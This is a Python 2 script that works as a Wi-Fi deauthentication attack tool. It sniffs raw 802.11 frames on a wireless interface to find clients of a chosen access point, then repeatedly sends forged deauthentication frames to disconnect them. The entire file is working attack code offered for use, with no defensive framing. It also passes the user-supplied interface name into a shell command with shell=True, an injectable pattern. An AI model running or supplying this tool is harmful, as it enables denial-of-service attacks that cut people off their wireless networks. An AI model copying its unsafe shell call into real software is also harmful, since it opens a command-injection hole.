import struct
import socket
import argparse
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", help="Wireless interface", type=str, required=True)
parser.add_argument("-b", "--bssid", help="MAC of the AP you would like to deauth", type=str, required=True)
parser.add_argument("-c", "--channel", help="Channel of the AP", type=int, required=True)
parser.add_argument("-t", "--target", help="Target MAC", type=str)

def getRadiotapHeader():
        r_rev = 0
        r_pad = 0
        r_len = 26
        r_preset_flags = 0x0000482f
        r_timestamp = 0
        r_flags = 0
        r_rate = 2
        r_freq = 2437
        r_ch_type = 0xa0
        r_signal = -48
        r_antenna = 1
        r_rx_flags = 0

        return struct.pack('BBHIQBBHHbBH', r_rev, r_pad, r_len, r_preset_flags, r_timestamp, r_flags, r_rate, r_freq, r_ch_type, r_signal, r_antenna, r_rx_flags)

def getDeauthFrame(mac, target):
        deauth_frame = struct.pack('!H', 1)
        return getRadiotapHeader() + getDot11(mac, target) + deauth_frame

def getDot11(mac_src, mac_dst):
    dot11_type_sub = 0xc0
    dot11_flags = 0
    dot11_seq = 1810
    dot11 = struct.pack('HH6s6s6sH', dot11_type_sub, dot11_flags, mac_dst.decode("hex"), mac_src.decode("hex"), mac_src.decode("hex"), dot11_seq)
    return dot11

def main():
    args = parser.parse_args()

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind((args.interface, 0x0003))

    process = subprocess.Popen("iwconfig {} channel {} > /dev/null 2>&1".format(args.interface, args.channel), shell=True, stdout=subprocess.PIPE)
    process.wait()

    targets = []

    while True:
        frame = s.recvfrom(2048)[0]
        beacon = frame[struct.unpack('h', frame[2:4])[0]:struct.unpack('h', frame[2:4])[0] + 24].encode('hex')
        frame_type = beacon[:2]
        frame_destination = beacon[8:20]
        frame_source = beacon[20:32]

        if frame_type == '84':
            if frame_destination not in targets and frame_source.upper() == args.bssid.replace(":", "").upper():
                if args.target is not None and args.target.replace(":", "").upper() not in frame_destination.upper():
                    continue
                targets.append(frame_destination)

            for target in targets:
                deauth_frame = getDeauthFrame(frame_source, target)
                for x in range(0, 5):
                    s.send(deauth_frame)
                targets.remove(target)

if __name__ == '__main__':
    main()